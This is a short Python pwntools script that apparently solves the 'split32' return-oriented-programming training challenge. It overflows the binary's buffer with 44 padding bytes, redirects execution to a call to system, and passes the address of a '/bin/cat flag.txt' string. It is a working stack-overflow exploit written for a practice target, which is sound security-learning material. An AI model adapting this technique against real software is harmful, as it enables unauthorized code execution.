from pwn import *
import struct

# eip = struct.pack("<Q",system_addr)
# eip2 = "\x59\x86\x04\x08\x00\x00\x00\x00"

e = ELF("/home/osboxes/PycharmProjects/ROP/split32/split32")

crap = 'A' * 44
# crap_len_in_bytes = len(crap.encode('utf-8'))

# 0x08048657  call sym.imp.system
system_eip = p32(0x08048657)

# 0x0804a030  "/bin/cat flag.txt"
flag_string = p32(0x0804a030)


io = e.process()

io.sendline(crap + system_eip + flag_string)

io.interactive()
